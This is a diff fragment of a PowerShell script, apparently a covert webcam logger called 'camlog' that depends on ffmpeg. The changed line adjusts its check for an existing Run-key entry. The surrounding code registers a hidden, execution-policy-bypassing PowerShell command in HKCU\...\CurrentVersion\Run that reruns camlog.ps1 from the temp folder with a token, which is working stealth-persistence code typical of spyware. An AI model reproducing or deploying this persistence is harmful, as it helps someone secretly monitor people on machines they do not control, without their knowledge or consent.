@@ -60,7 +60,7 @@ if(-not (Test-Path -Path 'ffmpeg/ffmpeg.exe' -PathType Leaf)){
 }
 
 if($DaysRun -eq -1 -or $DaysRun -gt 0){
-    if($null -ne (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'camlog').Test){ return };
+    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\camlog'){ return };
 
     $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Anontoken=' + $Anontoken + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item camlog.ps1 | Invoke-Expression;sleep 5;exit'); 
     New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'camlog' -Value $autostart;
